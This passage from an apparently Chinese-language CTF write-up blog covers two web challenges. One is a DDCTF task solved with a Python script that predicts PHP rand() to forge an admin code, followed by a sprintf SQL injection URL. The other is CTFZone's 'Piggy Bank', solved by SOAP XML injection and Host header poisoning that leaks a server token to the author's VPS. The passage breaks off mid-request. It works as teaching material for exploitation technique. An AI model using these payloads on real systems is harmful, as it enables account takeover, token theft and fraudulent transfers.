class=\"line\">        $title = <span class=\"string\">''</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $sql = sprintf(<span class=\"string\">\"SELECT * FROM article WHERE id='%s' $title\"</span>, $id);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($pdo-&gt;query($sql) <span class=\"keyword\">as</span> $row) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;h1&gt;\"</span>.$row[<span class=\"string\">'title'</span>].<span class=\"string\">\"&lt;/h1&gt;&lt;br&gt;\"</span>.$row[<span class=\"string\">'content'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">die</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到该地方使用了两次sprintf，可以立马想到<a href=\"https://paper.seebug.org/386/\" target=\"_blank\" rel=\"noopener\">从WordPress SQLi谈PHP格式化字符串问题</a>,问题就是，需要以admin的身份登录。</p>\n<h3 id=\"login-php\"><a href=\"#login-php\" class=\"headerlink\" title=\"login.php\"></a>login.php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($_SERVER[&apos;REQUEST_METHOD&apos;] === &quot;POST&quot;) &#123;</span><br><span class=\"line\">    if(!(isset($_POST[&apos;csrf&apos;]) and (string)$_POST[&apos;csrf&apos;] === $_SESSION[&apos;csrf&apos;])) &#123;</span><br><span class=\"line\">        die(&quot;CSRF token error!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = (isset($_POST[&apos;username&apos;]) === true &amp;&amp; $_POST[&apos;username&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;username&apos;] : die(&apos;Missing username&apos;);</span><br><span class=\"line\">    $password = (isset($_POST[&apos;password&apos;]) === true &amp;&amp; $_POST[&apos;password&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;password&apos;] : die(&apos;Missing password&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (strlen($username) &gt; 32 || strlen($password) &gt; 32) &#123;</span><br><span class=\"line\">        die(&apos;Invalid input&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $sth = $pdo-&gt;prepare(&apos;SELECT password FROM users WHERE username = :username&apos;);</span><br><span class=\"line\">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username]);</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($sth-&gt;fetch()[0] !== $password) &#123;</span><br><span class=\"line\">        die(&apos;wrong password&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $sth = $pdo-&gt;prepare(&apos;SELECT `identity` FROM users WHERE username = :username&apos;);</span><br><span class=\"line\">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username]);</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($sth-&gt;fetch()[0] === &quot;admin&quot;) &#123;</span><br><span class=\"line\">        $_SESSION[&apos;is_admin&apos;] = true;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $_SESSION[&apos;is_admin&apos;] = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    #echo $username;</span><br><span class=\"line\">    header(&quot;Location: index.php&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>login部分使用pdo进行查询，并且字符串之间的比较也是”===”，不可能存在任何漏洞。</p>\n<h3 id=\"register-php\"><a href=\"#register-php\" class=\"headerlink\" title=\"register.php\"></a>register.php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(!(isset($_POST[&apos;csrf&apos;]) and (string)$_POST[&apos;csrf&apos;] === $_SESSION[&apos;csrf&apos;])) &#123;</span><br><span class=\"line\">        die(&quot;CSRF token error!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $admin = &quot;admin###&quot; . substr(str_shuffle(&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;), 0, 32);</span><br><span class=\"line\">    $username = (isset($_POST[&apos;username&apos;]) === true &amp;&amp; $_POST[&apos;username&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;username&apos;] : die(&apos;Missing username&apos;);</span><br><span class=\"line\">    $password = (isset($_POST[&apos;password&apos;]) === true &amp;&amp; $_POST[&apos;password&apos;] !== &apos;&apos;) ? (string)$_POST[&apos;password&apos;] : die(&apos;Missing password&apos;);</span><br><span class=\"line\">    $code = (isset($_POST[&apos;code&apos;]) === true) ? (string)$_POST[&apos;code&apos;] : &apos;&apos;;</span><br><span class=\"line\">    if (strlen($username) &gt; 32 || strlen($password) &gt; 32) &#123;</span><br><span class=\"line\">        die(&apos;Invalid input&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $sth = $pdo-&gt;prepare(&apos;SELECT username FROM users WHERE username = :username&apos;);</span><br><span class=\"line\">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username]);</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($sth-&gt;fetch() !== false) &#123;</span><br><span class=\"line\">        die(&apos;username has been registered&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if($code === $admin) &#123;</span><br><span class=\"line\">        $identity = &quot;admin&quot;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $identity = &quot;guest&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $sth = $pdo-&gt;prepare(&apos;INSERT INTO users (username, password, `identity`) VALUES (:username, :password, :identity)&apos;);</span><br><span class=\"line\">    $sth-&gt;execute([&apos;:username&apos; =&gt; $username, &apos;:password&apos; =&gt; $password, &apos;:identity&apos; =&gt; $identity]);</span><br><span class=\"line\"></span><br><span class=\"line\">    echo &apos;&lt;script&gt;alert(&quot;register success&quot;);location.href=&quot;./login.php&quot;&lt;/script&gt;&apos;;</span><br><span class=\"line\">&#125; else &#123;</span><br></pre></td></tr></table></figure>\n<p>register部分，使用str_shuffle生成admin密码，同时给出rand()来作为csrf值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; id=&quot;csrf&quot; value=&quot;&lt;?php $_SESSION[&apos;csrf&apos;] = (string)rand();echo $_SESSION[&apos;csrf&apos;]; ?&gt;&quot; required&gt;</span><br><span class=\"line\">&lt;label for=&quot;inputUsername&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt;</span><br></pre></td></tr></table></figure>\n<p>可以想到乌云的一篇文章，也是翻译自国外，原文可以自己找<a href=\"https://wooyun.js.org/drops/Web%E5%BA%94%E7%94%A8%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.html\" target=\"_blank\" rel=\"noopener\">Web应用隐形后门的设计与实现</a>。这样的话，就可以明确思路，首先通过预测rand()值，来预测密码，在使用该密码注册一个账号，进入博客，然后通过sprintf格式化漏洞获取flag。</p>\n<h2 id=\"解题-1\"><a href=\"#解题-1\" class=\"headerlink\" title=\"解题\"></a>解题</h2><p>现在关键就是预测rand()值，通过google，可以找到0ctf2016,有相似的题目，<a href=\"http://www.vuln.cn/6004\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6004</a>,文中提到，只要有大于等于32个连续的rand()随机数，就可以大概预测接下来rand()的值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!php</span><br><span class=\"line\">state[i] = state[i-3] + state[i-31]</span><br><span class=\"line\">return state[i] % 2147483648</span><br></pre></td></tr></table></figure>\n<p>同时，需要知道一定要使用 requests.session来keep-alive，否则的话，获得的rand()值并不是连续的，也就不满足上面的公式了。</p>\n<p>此外，在获得超过32个rand()值之后，并预测到接下来的62个rand()之后，还需要重新实现str_shuffle函数。通过阅读php源码，可以找到str_shuffle函数的实现。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static void php_string_shuffle(char *str, long len TSRMLS_DC) /* &#123;&#123;&#123; */</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tlong n_elems, rnd_idx, n_left;</span><br><span class=\"line\">\tchar temp;</span><br><span class=\"line\">\t/* The implementation is stolen from array_data_shuffle       */</span><br><span class=\"line\">\t/* Thus the characteristics of the randomization are the same */</span><br><span class=\"line\">\tn_elems = len;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (n_elems &lt;= 1) &#123;</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tn_left = n_elems;</span><br><span class=\"line\"></span><br><span class=\"line\">\twhile (--n_left) &#123;</span><br><span class=\"line\">\t\trnd_idx = php_rand(TSRMLS_C);</span><br><span class=\"line\">\t\tRAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);</span><br><span class=\"line\">\t\tif (rnd_idx != n_left) &#123;</span><br><span class=\"line\">\t\t\ttemp = str[n_left];</span><br><span class=\"line\">\t\t\tstr[n_left] = str[rnd_idx];</span><br><span class=\"line\">\t\t\tstr[rnd_idx] = temp;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中RAND_RANGE函数的实现如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define RAND_RANGE(__n, __min, __max, __tmax) \\</span><br><span class=\"line\">(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</span><br></pre></td></tr></table></figure>\n<p>准备工作就绪，就可以编写代码了。<br>代码如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">from lxml import etree</span><br><span class=\"line\"></span><br><span class=\"line\">url = &quot;http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    &apos;username&apos;: &apos;dida&apos;,</span><br><span class=\"line\">    &apos;password&apos;: &apos;dida&apos;,</span><br><span class=\"line\">    &apos;csrf&apos;: &apos;2086003527&apos;,</span><br><span class=\"line\">    &apos;code&apos;: &apos;&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">def get_csrf(html):</span><br><span class=\"line\">    html = etree.HTML(html)</span><br><span class=\"line\">    token = html.xpath(&apos;//*[@id=&quot;csrf&quot;]&apos;)[0].get(&apos;value&apos;)</span><br><span class=\"line\">    return token</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def rand_range(rand, n_left):</span><br><span class=\"line\">     return int((n_left + 1.0) * (rand / (2147483648.0)))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def shuffle(calc_rand):</span><br><span class=\"line\">    str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class=\"line\">    str_temp = list(str)</span><br><span class=\"line\">    str_len = len(str_temp)</span><br><span class=\"line\">    n_left = str_len - 1</span><br><span class=\"line\">    temp = &quot;&quot;</span><br><span class=\"line\">    while n_left:</span><br><span class=\"line\">        randdata = calc_rand[61 - n_left]</span><br><span class=\"line\">        index = rand_range(randdata, n_left)</span><br><span class=\"line\">        if index != n_left:</span><br><span class=\"line\">            temp = str_temp[n_left]</span><br><span class=\"line\">            str_temp[n_left] = str_temp[index]</span><br><span class=\"line\">            str_temp[index] = temp</span><br><span class=\"line\">        n_left = n_left - 1</span><br><span class=\"line\"></span><br><span class=\"line\">    return &quot;&quot;.join(str_temp)</span><br><span class=\"line\"></span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    s = requests.session()</span><br><span class=\"line\">    l = []</span><br><span class=\"line\">    for i in range(33):</span><br><span class=\"line\">        res = s.get(url)</span><br><span class=\"line\">        token = get_csrf(res.content)</span><br><span class=\"line\">        l.append(token)</span><br><span class=\"line\"></span><br><span class=\"line\">    calc_rand = []</span><br><span class=\"line\">    temp_calc_rand = []</span><br><span class=\"line\">    for i in range(33, 95):</span><br><span class=\"line\">        value = (int(l[i - 31]) + int(l[i-3])) % 2147483648</span><br><span class=\"line\">        l.append(value)</span><br><span class=\"line\">        temp_calc_rand.append(value)</span><br><span class=\"line\"></span><br><span class=\"line\">    str = &quot;admin###&quot; + shuffle(temp_calc_rand)[0:32]</span><br><span class=\"line\">    data[&apos;code&apos;] = str</span><br><span class=\"line\">    data[&apos;csrf&apos;] = l[32]</span><br><span class=\"line\"></span><br><span class=\"line\">    res = s.post(url = url, data = data)</span><br><span class=\"line\">    print(res.content)</span><br><span class=\"line\">    break</span><br></pre></td></tr></table></figure>\n<p>运行上边的代码，就可以注册一个账号，至于该账号是不是admin,多试几次总会成功。</p>\n<p>登陆之后，就可以使用sprintf字符串格式化漏洞来进行sql注入。这个就不在赘述了。<br>基本的payload如下:</p>\n<blockquote>\n<p><a href=\"http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&amp;title=%1$&#39;\" target=\"_blank\" rel=\"noopener\">http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&amp;title=%1$&#39;</a> or 2=1 union select 1,2,3%23</p>\n</blockquote>\n<p>最后得到flag: <code>DDCTF{9b7ccc1e96387b5ce079adab2fb08022}</code></p>"},{"title":"ctfzone-ctf","date":"2018-08-03T02:11:42.000Z","_content":"\n# Web\n\n## Piggy Bank\n\n1. 根据注释找到*http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php*\n\n   ```xml\n   <wsdl:definitions xmlns:tns=\"urn:Bank\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:wsdl=\"http://schemas.xmlsoap.org/wsdl/\" xmlns=\"http://schemas.xmlsoap.org/wsdl/\" name=\"Bank\" targetNamespace=\"urn:Bank\">\n   <message name=\"BalanceRequest\">\n   <part name=\"wallet_num\" type=\"xsd:decimal\"/>\n   </message>\n   <message name=\"BalanceResponse\">\n   <part name=\"code\" type=\"xsd:float\"/>\n   <part name=\"status\" type=\"xsd:string\"/>\n   </message>\n   <message name=\"internalTransferRequest\">\n   <part name=\"receiver_wallet_num\" type=\"xsd:decimal\"/>\n   <part name=\"sender_wallet_num\" type=\"xsd:decimal\"/>\n   <part name=\"amount\" type=\"xsd:float\"/>\n   <part name=\"token\" type=\"xsd:string\"/>\n   </message>\n   <message name=\"internalTransferResponse\">\n   <part name=\"code\" type=\"xsd:float\"/>\n   <part name=\"status\" type=\"xsd:string\"/>\n   </message>\n   <portType name=\"BankServicePort\">\n   <operation name=\"requestBalance\">\n   <input message=\"tns:BalanceRequest\"/>\n   <output message=\"tns:BalanceResponse\"/>\n   </operation>\n   <operation name=\"internalTransfer\">\n   <input message=\"tns:internalTransferRequest\"/>\n   <output message=\"tns:internalTransferResponse\"/>\n   </operation>\n   </portType>\n   <binding name=\"BankServiceBinding\" type=\"tns:BankServicePort\">\n   <soap:binding style=\"rpc\" transport=\"http://schemas.xmlsoap.org/soap/http\"/>\n   <operation name=\"requestBalance\">\n   <soap:operation soapAction=\"urn:requestBalanceAction\"/>\n   <input>\n   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n   </input>\n   <output>\n   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n   </output>\n   </operation>\n   <operation name=\"internalTransfer\">\n   <soap:operation soapAction=\"urn:internalTransferAction\"/>\n   <input>\n   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n   </input>\n   <output>\n   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n   </output>\n   </operation>\n   </binding>\n   <wsdl:service name=\"BankService\">\n   <wsdl:port name=\"BankServicePort\" binding=\"tns:BankServiceBinding\">\n   <soap:address location=\"http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php\"/>\n   </wsdl:port>\n   </wsdl:service>\n   </wsdl:definitions>\n   ```\n\n2. 包含两个API\n\n   - **Request Balance** allows us to see the balance of any account id we want.\n   - **Internal Transfer** transfers some amount from account *sender* to account *receiver*.\n\n3. 解法1：XML/soap注入\n\n   internalTransfer请求：\n\n   ```xml\n   <receiver_wallet_num xsi:type=\"xsd:decimal\"> [DATA FROM FORM INPUT] </receiver_wallet_num>\n   <sender_wallet_num xsi:type=\"xsd:decimal\"> [LOGGED IN USER ID] </sender_wallet_num>\n   <amount xsi:type=\"xsd:float\"> [DATA FROM FORM INPUT] </amount>\n   <token xsi:type=\"xsd:string\"> [SECRET SERVER TOKEN] </token>\n   ```\n\n   传递参数Receiver:\n\n   ```\n   (Our ID) </receiver_wallet_num>\n   <sender_wallet_num xsi:type=\"xsd:decimal\">(Any ID)</sender_wallet_num><!--\n   ```\n\n   传递参数Amount:\n\n   ```\n   --><amount xsi:type=\"xsd:float\"> (Amount)\n   ```\n\n   结果:\n\n   ```xml\n   <receiver_wallet_num xsi:type=\"xsd:decimal\"> (Our ID) </receiver_wallet_num>\n   <sender_wallet_num xsi:type=\"xsd:decimal\">(Any ID)</sender_wallet_num>\n   <!-- </receiver_wallet_num>\n   <sender_wallet_num xsi:type=\"xsd:decimal\"> [LOGGED IN USER ID] </sender_wallet_num>\n   <amount xsi:type=\"xsd:float\"> \n   -->\n   <amount xsi:type=\"xsd:float\"> (Amount) </amount>\n   <token xsi:type=\"xsd:string\"> [SECRET SERVER TOKEN] </token>\n   ```\n\n   然后开burp跑就行。\n\n   ![](/assets/ctfzone/TIM截图20180803174532.png)\n\n4. 解法2：Host header poisoning\n\n   从上图，我们可以看到当前Host是`web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one`\n\n   修改该Host为我们的vps_ip,并在我们的vps上创建`/api/bankservice.wsdl.php`文件，然后发包，监听80端口。\n\n   ![](/assets/ctfzone/TIM截图20180803181237.png)\n\n   监听端口:\n\n   >ngrep -q -d eth0 -W byline port 80\n\n   抓包结果：\n\n   ```\n   T 10.135.89.224:80 -> 18.184.147.62:46038 [A]\n   HTTP/1.1 200 OK.\n   Date: Fri, 03 Aug 2018 10:08:43 GMT.\n   Server: Apache/2.4.6 (CentOS) PHP/5.4.16.\n   X-Powered-By: PHP/5.4.16.\n   Content-Length: 2907.\n   Connection: close.\n   Content-Type: text/html; charset=UTF-8.\n   .\n   <?xml version=\"1.0\" encoding=\"utf-8\"?><wsdl:definitions name=\"Bank\"\n                targetNamespace=\"urn:Bank\"\n                xmlns:tns=\"urn:Bank\"\n                xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"\n                xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n                xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\"\n                xmlns:wsdl=\"http://schemas.xmlsoap.org/wsdl/\"\n                xmlns=\"http://schemas.xmlsoap.org/wsdl/\">\n   \n       <message name=\"BalanceRequest\">\n           <part name=\"wallet_num\" type=\"xsd:decimal\"/>\n       </message>\n   \n       <message name=\"BalanceResponse\">\n           <part name=\"code\" type=\"xsd:float\"/>\n           <part name=\"status\" type=\"xsd:string\"/>\n       </message>\n   \n       <message name=\"internalTransferRequest\">\n           <part name=\"receiver_wallet_num\" type=\"xsd:decimal\"/>\n           <part name=\"sender_wallet_num\" type=\"xsd:decimal\"/>\n           <part name=\"amount\" type=\"xsd:float\"/>\n           <part name=\"token\" type=\"xsd:string\"/>\n       </message>\n   \n       <message name=\"internalTransferResponse\">\n           <part name=\"code\" type=\"xsd:float\"/>\n           <part name=\"status\" type=\"xsd:string\"/>\n       </message>\n   \n       <portType name=\"BankServicePort\">\n           <operation name=\"requestBalance\">\n               <input message=\"tns:BalanceRequest\"/>\n               <output message=\"tns:BalanceResponse\"/>\n           </operation>\n           <operation name=\"internalTransfer\">\n               <input message=\"tns:internalTransferRequest\"/>\n               <output message=\"tns:internalTransferResponse\"/>\n           </operation>\n       </portType>\n   \n       <binding name=\"BankServiceBinding\" type=\"tns:BankServicePort\">\n           <soap:binding style=\"rpc\" transport=\"http://schemas.xmlsoap.org/soap/http\"/>\n           <operation name=\"requestBalance\">\n               <soap:operation soapAction=\"urn:requestBalanceAction\"/>\n               <input>\n                   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n               </input>\n               <output>\n                   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n               </output>\n           </operation>\n           <operation name=\"internalTransfer\">\n               <soap:operation soapAction=\"urn:internalTransferAction\"/>\n               <input>\n                   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n               </input>\n               <output>\n                   <soap:body use=\"encoded\" namespace=\"urn:Bank\" encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n               </output>\n           </operation>\n       </b\n   \n   T 10.135.89.224:80 -> 18.184.147.62:46038 [AP]\n   inding>\n   \n       <wsdl:service name=\"BankService\">\n           <wsdl:port name=\"BankServicePort\" binding=\"tns:BankServiceBinding\">\n               <soap:address location=\"http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php\" />\n           </wsdl:port>\n       </wsdl:service>\n   </wsdl:definitions>\n   \n   T 18.184.147.62:46040 -> 10.135.89.224:80 [AP]\n   POST /api/bankservice.php HTTP/1.1.\n   Host: 123.207.90.143.\n   Connection: Keep-Alive.\n   User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.\n   Content-Type: application/soap+xml; charset=utf-8; action=\"internalTransferAction\".\n   Content-Length: 869.\n   .\n   <SOAP-ENV:Envelope SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"urn:Bank\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n         <SOAP-ENV:Body>\n           <ns1:internalTransfer>\n             <receiver_wallet_num xsi:type=\"xsd:decimal\">1340</receiver_wallet_num>.\n   <sender_wallet_num xsi:type=\"xsd:decimal\">.2652.</sender_wallet_num><!--</receiver_wallet_num>\n             <sender_wallet_num xsi:type=\"xsd:decimal\">1340</sender_wallet_num>\n             <amount xsi:type=\"xsd:float\">--><amount xsi:type=\"xsd:float\">750000</amount>\n             <token xsi:type=\"xsd:token\">somesupertokenkey1235555</token>\n           </ns1:internalTransfer>\n         </SOAP-ENV:Body>\n       </SOAP-ENV:Envelope>\n      \n   T 10.135.89.224:80 -> 18.184.147.62:46040 [AP]\n   HTTP/1.1 404 Not Found.\n   Date: Fri, 03 Aug 2018 10:08:43 GMT.\n   Server: Apache/2.4.6 (CentOS) PHP/5.4.16.\n   Content-Length: 217.\n   Keep-Alive: timeout=5, max=100.\n   Connection: Keep-Alive.\n   Content-Type: text/html; charset=iso-8859-1.\n   .\n   <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n   <html><head>\n   <title>404 Not Found</title>\n   </head><body>\n   <h1>Not Found</h1>\n   <p>The requested URL /api/bankservice.php was not found on this server.</p>\n   </body></html>\n   ```\n\n   这样我们就拿到了token，然后就可以愉快的转账了。\n\n   直接按这个发这个包即可:\n\n   ```\n   T 18.184.147.62:46040 -> 10.135.89.224:80 [AP]\n   POST /api/bankservice.php HTTP/1.1.\n   Host: 123.207.90.143.\n   Connection: Keep-Alive.\n   User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.\n   Content-Type: application/soap+xml; charset=utf-8; action=\"internalTransferAction\".\n   Content-Length: 869.\n   .\n   <SOAP-ENV:Envelope SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"urn:Bank\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n         <SOAP-ENV:Body>\n           <ns1:internalTransfer>\n    